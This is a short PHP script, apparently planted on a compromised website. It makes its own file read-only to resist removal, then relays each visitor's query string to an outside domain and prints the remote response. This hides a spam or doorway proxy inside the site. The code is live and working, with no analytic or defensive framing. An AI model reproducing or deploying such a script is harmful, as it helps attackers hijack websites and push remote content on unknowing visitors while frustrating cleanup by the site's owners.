<?php
header("Content-type: text/html; charset=gb2312");
$a=100;
chmod(substr($_SERVER['PHP_SELF'] ,strrpos($_SERVER['PHP_SELF'] ,'/')+1 ),0444);
$p = rand(0,$a);
if($p<50)
$url = "http://www.vrshizuishan.cn/li/1wg/";
else
$url = "http://www.vrshizuishan.cn/li/1wg/"; 
$curl_handle = curl_init(); 
curl_setopt ($curl_handle, CURLOPT_URL, $url . '?' .  (string)$_SERVER['QUERY_STRING']); 
curl_setopt ($curl_handle, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($curl_handle, CURLOPT_CONNECTTIMEOUT, 18); 
echo curl_exec($curl_handle); 
?>

